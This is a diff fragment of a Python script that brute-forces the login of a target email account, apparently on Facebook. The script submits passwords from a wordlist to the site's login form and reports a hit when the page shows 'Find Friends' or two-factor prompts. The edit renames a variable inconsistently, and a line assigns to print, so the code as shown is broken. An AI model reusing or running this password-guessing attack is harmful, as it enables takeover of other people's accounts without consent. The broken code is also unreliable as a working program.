@@ -25,21 +25,21 @@ print ("\nTarget Email ID : ",email+"")
 print ("\nTrying Passwords from list ")
 i=0
 while file:
-	password=file.readline().strip()
+	passwords=file.readline().strip()
 	i+=1
 	if len(password) < 6:
 		continue
-	print=str(i) +" : ",password
+	print=str(i) +" : ",passwords
 	response = webbrowser.open(post_url)
 	try:
 		if response.code == 200:
 			webbrowser.select_form(nr=0)
 			webbrowser.form['email'] = email
-			webbrowser.form['pass'] = password
+			webbrowser.form['pass'] = passwords
 			response = webbrowser.submit()
 			response_data = response.read()
 			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
-				print('Your password is : ',password)
+				print('Your password is : ',passwords)
 				break
 	except:
 		print('\nSleeping for time : 2 min\n')
